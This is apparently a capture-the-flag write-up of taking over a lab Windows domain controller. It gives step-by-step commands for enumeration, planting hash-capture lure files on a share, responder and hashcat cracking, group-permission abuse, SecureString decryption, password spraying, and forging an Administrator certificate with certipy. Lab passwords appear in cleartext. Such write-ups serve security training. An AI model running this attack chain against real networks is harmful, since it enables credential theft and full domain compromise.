#Pwned #Certificate #Phishing #Bloodhound
```IP
192.168.249.30
```
# Enumeration
## Nmap

As always I start enumerating target ports with nmap:
```Bash
sudo nmap -sCV 192.168.249.30 -vvv -p- -oN enum/full
```
The output being:
```
PORT      STATE SERVICE       REASON          VERSION 
53/tcp    open  domain        syn-ack ttl 125 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2024-12-12 14:42:10Z)
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn      
389/tcp   open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: nara-security.com0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 125
464/tcp   open  kpasswd5?     syn-ack ttl 125
593/tcp   open  ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: nara-security.com0., Site: Default-First-Site-Name)
3268/tcp  open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: nara-security.com0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: nara-security.com0., Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
5985/tcp  open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 125 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49684/tcp open  ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49693/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49704/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49707/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49738/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
Service Info: Host: NARA; OS: Windows; CPE: cpe:/o:microsoft:windows

```
## SMB
We can start by enumerating samba shares with the following command:
```bash
nxc smb 192.168.249.30 -u 'guest' -p '' --shares
```

It seems like we can access and write some directories with:
```bash
smbclient //192.168.249.30/nara -U nara-security.com\guest
```

In nara share we find important.txt. We can deduct that some kind of phishing attack may work. I first tried with .exe or .odt to no avail.

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241212163917.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241212163939.png?raw=true)

# Exploitation
With the following tool (hashgrab.py) we can force authentication to our machine if a user clicks on any of our generated files:
https://github.com/xct/hashgrab

```
python hashgrab/hashgrab.py 192.168.45.189 hash
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241212170454.png?raw=true)

Now we can upload it to smb Documents folder and upon setting responder we will receive hash shown below:
```
sudo responder -I tun0
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241212170708.png?raw=true)

It is possible to crack it with hashcat with the following command:
```
hashcat -m 5600 files/tracy.hash /usr/share/wordlists/rockyou.txt --force
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241212171126.png?raw=true)

Above we have the password cracked. With nxc and the new password we can see some hits on rdp and ldap but it doesn't say pwned, therefore we do not have write permissions on those services.

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241212172000.png?raw=true)

Eventhough we can not access, it is possible now to run bloodhound:
```
bloodhound-python -d nara-security.com -c all -u tracy.white -p 'zqwj041FGX' -ns 192.168.249.30 --zip
```

By investigating the output, we find out that we have generic all over remote access grouo.

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241212175735.png?raw=true)

This means that we have permissions over that group, so we could add any user to it. So by executing the following commandit should be possible to add tracy.white to group "remote access" group:
```bash
net rpc group addmem "Remote Access" "tracy.white" -U "nara-security.com"/"tracy.white"%"zqwj041FGX" -S "nara-security.com"
```

And now it should be possible to access remotely as tracy.white with evil-winrm:

```bash
evil-winrm -i 192.168.249.30 -u tracy.white -p 'zqwj041FGX'
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241212175643.png?raw=true)

# PrivEsc

## Manual

We can find right away in the documents directory the following suspicious file:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241212180025.png?raw=true)

When prompting its contents, they seem like a hash. Let's now think as a user. The user encrypted here something, likely a password. Something he could have googled is "How to encrypt a password in windows powershell?"
If we google exactly that we get some answers. Example given:
https://medium.com/@josephjhinshaw/powershell-encryption-38a044db3942
Which have some powershell commands as `ConvertTo-SecureString`.

So the question we should google would be "How to decrypt powershell secure string?"
StackOverflow will give us the answer:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241212182706.png?raw=true)

https://stackoverflow.com/questions/7468389/powershell-decode-system-security-securestring-to-readable-password

We asume then that this is a standart ciphered string obtained with the convertfrom-securestring cmdlet. Following the commands below we can decrypt this encrypted string:

```
$credentials = '01000000d08c9ddf0115d1118c7a00c04fc297eb0100000001e86ea0aa8c1e44ab231fbc46887c3a0000000002000000000003660000c000000010000000fc73b7bdae90b8b2526ada95774376ea0000000004800000a000000010000000b7a07aa1e5dc859485070026f64dc7a720000000b428e697d96a87698d170c47cd2fc676bdbd639d2503f9b8c46dfc3df4863a4314000000800204e38291e91f37bd84a3ddb0d6f97f9eea2b'
```
```
$secure = convertTo-securestring -string $credentials
```
```
$Ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($secure)
```
```
$result = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($Ptr)
```
```
[System.Runtime.InteropServices.Marshal]::ZeroFreeCoTaskMemUnicode($Ptr)
```
```
$result
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241213091156.png?raw=true)

When executed, we obtain the following string:
```
hHO_S9gff7ehXw
```
We now spray the password. But first we need a complete user list. I've done this by bruteforcing the RIDs with nxc and tracy.white credentials:

```
nxc smb 192.168.132.30 -u 'tracy.white' -p 'zqwj041FGX' --rid-brute 3000 > users2.txt
```

After some data cleaning, we have our clean user list and we can use it to spray the password effectively:

```
nxc winrm 192.168.132.30 -u users2.txt -p 'hHO_S9gff7ehXw'
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241213092921.png?raw=true)

We have pwned Jodie.Summers. We can access as her user:
```
evil-winrm -i 192.168.132.30 -u jodie.summers -p 'hHO_S9gff7ehXw'
```
After some enumeration, we observe that jodie.summers belongs to Enrollment group:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241213131507.png?raw=true)

If recall correctly, in the nmap scan we saw that this machine is also a Certificate Authority (CA).

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241213131213.png?raw=true)

We can check for CA related vulnerabilities with certipy-ad tool as shown below:
```
certipy-ad find -vulnerable -stdout -u Jodie.Summers@192.168.132.30 -p 'hHO_S9gff7ehXw'
```
In the official github webpage we can find how to leverage these attacks:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241213131321.png?raw=true)

The tool indicates that Enrollment group has dangerous permissions. It allows its users to request a certificate based on the vulnerable certificate template and specify an arbitrary UPN or DNS SAN
```bash
certipy-ad req -username Jodie.Summers@192.168.132.30 -password hHO_S9gff7ehXw -ca NARA-CA -target nara-security.com -template NaraUser -upn Administrator@nara-security.com
```
With this new certificate and private key we can retrieve an NT hash for Administrator with:
```bash
certipy-ad auth -pfx administrator_dc.pfx -dc-ip 192.168.132.30
```

And with that hash we can get remote access with evil-winrm! Pwned!

